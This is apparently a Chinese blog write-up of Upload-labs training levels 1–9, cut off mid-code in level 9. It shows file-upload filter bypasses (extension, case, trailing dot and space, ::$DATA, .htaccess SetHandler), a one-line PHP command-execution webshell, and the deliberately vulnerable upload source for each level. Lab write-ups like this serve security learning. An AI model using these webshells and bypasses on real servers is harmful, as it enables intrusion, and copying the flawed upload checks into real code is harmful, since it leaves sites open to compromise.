
<!DOCTYPE html>
<html lang class="loading">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Upload-labs Write Up - Knlvre</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="Less-1本关介绍两种解题方法：
方法一
直接上传webshell.php时，发现前端弹出警告。按F12查看，在javascript的白名单中添加php这个后缀，然后就可以直接上传成功

方法二
,"> 
    <meta name="author" content="Knlvre"> 
    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
    <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/obsidian.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/ball-atom.min.css">
</head>
</html>

<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">Knlvre</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">Upload-labs Write Up</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg);">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
                
                September 20, 2019
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/09/20/Upload-labs Write Up/" title="Upload-labs Write Up">Upload-labs Write Up</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    55k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    50 mins.
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/Upload-labs/">Upload-labs</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>本关介绍两种解题方法：</p>
<p><strong>方法一</strong></p>
<p>直接上传<code>webshell.php</code>时，发现前端弹出警告。按<code>F12</code>查看，在<code>javascript</code>的<code>白名单</code>中添加<code>php</code>这个后缀，然后就可以直接上传成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-1.png" alt></p>
<p><strong>方法二</strong></p>
<p>先将webshell的后缀改为<code>png（或者白名单中任意后缀）</code>，然后上传，<code>Burpsuit</code>将数据包进行修改，重新将文件后缀改为<code>.php</code>，绕过前端验证就可以</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/1-2.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">function checkFile() {
    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;
    if (file == null || file == &quot;&quot;) {
        alert(&quot;请选择要上传的文件!&quot;);
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = &quot;.jpg|.png|.gif&quot;;
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {
        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
        alert(errMsg);
        return false;
    }
}
</code></pre>
<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>直接上传<code>.php</code>文件会提示<code>文件类型不正确，请重新上传！</code>。将文件后缀改为<code>.png</code>，抓包修改文件后缀为<code>.php</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/2-1.png" alt></p>
<p>直接上传成功，蚁剑连接成功</p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) {
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = &#39;上传出错！&#39;;
            }
        } else {
            $msg = &#39;文件类型不正确，请重新上传！&#39;;
        }
    } else {
        $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><blockquote>
<p>shell.phtml、shell.php3、shell.php5 等</p>
</blockquote>
<p>直接上传<code>.php</code>文件会提示<code>不允许上传.asp,.aspx,.php,.jsp后缀文件！</code>。将文件后缀改为<code>.png</code>，和 Less-2 一样抓包修改文件后缀，还是出现同样的提示</p>
<p>按照提示来看，应该是采用黑名单，那就用<code>.php3</code>试着绕过，发现上传成功（<code>php3</code>、<code>php5</code>、<code>phtml</code>）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/3-1.png" alt></p>
<p>但是这些后缀名我的蚁剑都不能连接，一句话内容更改为<code>代码执行</code>的命令时，也只有<code>phtml</code>能被解析</p>
<pre><code class="php">&lt;?php 
echo system($_GET[&#39;pass&#39;]);
?&gt;
</code></pre>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/3-2.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);
        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, &#39;.&#39;);
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = &#39;上传出错！&#39;;
            }
        } else {
            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;
        }
    } else {
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><blockquote>
<p>.htaccess</p>
</blockquote>
<p>直接上传<code>.php</code>文件只是提示<code>此文件不允许上传!</code>。将文件后缀改为<code>.png</code>，和 Less-2 一样抓包修改文件后缀为<code>php</code>或<code>phtml</code>等，还是出现同样的提示</p>
<p>但是可以上传<code>.htaccess</code>，内容如下（该行代码的作用是使服务器将所有类型的文件都解析为php）</p>
<pre><code class="php">SetHandler application/x-httpd-php
</code></pre>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/4-1.png" alt></p>
<blockquote>
<p>在使用 .htaccess 之前，需要先开启对其的支持</p>
<p>Linux：修改 /etc/apache2/apache2.conf 内的  AllowOverride 为 ALL（默认None）。然后重启 apache2 服务器</p>
</blockquote>
<p>上传成功后，我们上传一个大马，后缀随意</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/4-2.png" alt></p>
<p>成功上传并且可以解析连接</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/4-3.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);
        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, &#39;.&#39;);
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = &#39;上传出错！&#39;;
            }
        } else {
            $msg = &#39;此文件不允许上传!&#39;;
        }
    } else {
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><blockquote>
<p>shell.PHP、shell.PhP 等大小写</p>
</blockquote>
<p>先尝试前面的步骤，本关连<code>.htaccess</code>都无法上传，但是本关却可以通过大小写来绕过，尝试<code>.PHP</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/5-1.png" alt></p>
<p>尝试连接，成功</p>
<blockquote>
<p>注意：大写PHP后缀名的解析，同样只存在于部分版本的apache</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/5-2.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, &#39;.&#39;);
        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = &#39;上传出错！&#39;;
            }
        } else {
            $msg = &#39;此文件类型不允许上传！&#39;;
        }
    } else {
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
<p>本题从源码中可以看出来，前一关将后缀转换成小写的函数<code>strtolower()</code>在本关没有使用，所以可以导致大小写绕过黑名单</p>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><blockquote>
<p>shell.php (+ 空格)</p>
</blockquote>
<p>本关弥补了前一关的缺陷，对后缀名用<code>strtolower()</code>函数处理，所以前一关大写的<code>PHP</code>会变为<code>php</code>，还在黑名单之内，所以无法绕过。但是本关可以利用<code>添加空格</code>绕过黑名单，因为<code>strrchr()</code>获取<code>.</code>之后的内容，当我们添加空格时，自然也会被获取，但是黑名单中并没有<code>后缀名+空格</code>的形式，所以匹配失败，上传成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-1.png" alt></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-2.png" alt></p>
<p>可以绕过，那现在就是试一下实际上传效果，并且看上传上去后，能不能被正常解析</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-3.png" alt></p>
<p>可以被正常解析</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-4.png" alt></p>
<p>在上传文件夹内查看文件名，发现<code>php</code>后面并没有<code>空格</code>，这说明 空格 可以帮助我们绕过黑名单，并且生成文件时没有被保存下来</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/6-5.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
        $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, &#39;.&#39;);
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = &#39;上传出错！&#39;;
            }
        } else {
            $msg = &#39;此文件不允许上传&#39;;
        }
    } else {
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><blockquote>
<p>shell.php.</p>
<p>Windows 自动去掉文件名末尾的点</p>
</blockquote>
<p>本关弥补了前一关的缺陷，对后缀名用<code>trim()</code>函数处理，去掉了前后空格。但是本关相比前一关少了<code>deldot()</code>函数，没有对后缀中的<code>点(.)</code>进行删除，可以利用<code>Windows</code>的特性：<code>会自动去掉文件名末尾的点(.)</code>来绕过黑名单</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/7-1.png" alt></p>
<p>可以访问解析</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/7-2.png" alt></p>
<p>看一下文件名</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/7-3.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
        $file_ext = strrchr($file_name, &#39;.&#39;);
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = &#39;上传出错！&#39;;
            }
        } else {
            $msg = &#39;此文件类型不允许上传！&#39;;
        }
    } else {
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><blockquote>
<p>shell.php::$DATA</p>
<p>Windows 文件的流特性</p>
</blockquote>
<p>相比于上一关，少了过滤<code>::$DATA</code>字符串， 可以用这个上传</p>
<pre><code class="php">$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
</code></pre>
<p>这个是关于 Windows 下备用数据流 ，可以参考一下这篇文章：<a href="https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream" target="_blank" rel="noopener">Windows ::DATA alternate data stream</a></p>
<p>所以现在就可以利用这个来上传</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/8-2.png" alt></p>
<p>可以访问</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/8-1.png" alt></p>
<p>文件末尾自动去掉了<code>::$DATA</code>字符串</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/8-3.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, &#39;.&#39;);
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = &#39;上传出错！&#39;;
            }
        } else {
            $msg = &#39;此文件类型不允许上传！&#39;;
        }
    } else {
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><blockquote>
<p>shell.php. .(点 + 空格 + 点)</p>
<p>逻辑漏洞</p>
</blockquote>
<p>这关的漏洞点在于上传的文件名直接使用处理后的<code>$file_name（$_FILE[&#39;upload_file&#39;][&#39;name&#39;]）</code>，与后缀名的检查分开了，这样导致我们可以分开构造<code>文件名</code>和<code>后缀名</code>，算是一种逻辑漏洞</p>
<pre><code class="php">move_uploaded_file($temp_file, $img_path)
</code></pre>
<p>可以使文件名为<code>shell.php. .（点+空格+点）</code>，这样<code>strrchr()</code>截取到的结果是<code>. + 空格</code>，不再黑名单内，然后上传的文件名为<code>shell.php.</code>，<code>Windows</code>的解析特性：末尾空格会忽略（这就与 Less-7 情况一样）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/9-1.png" alt></p>
<p>可以访问并解析</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/9-2.png" alt></p>
<p>但是不理解为什么末尾2个点中间要加空格，不加空格的话，strrchr() 函数截取到<code>.</code>，照样不在黑名单内</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/9-3.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, &#39;.&#39;);
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
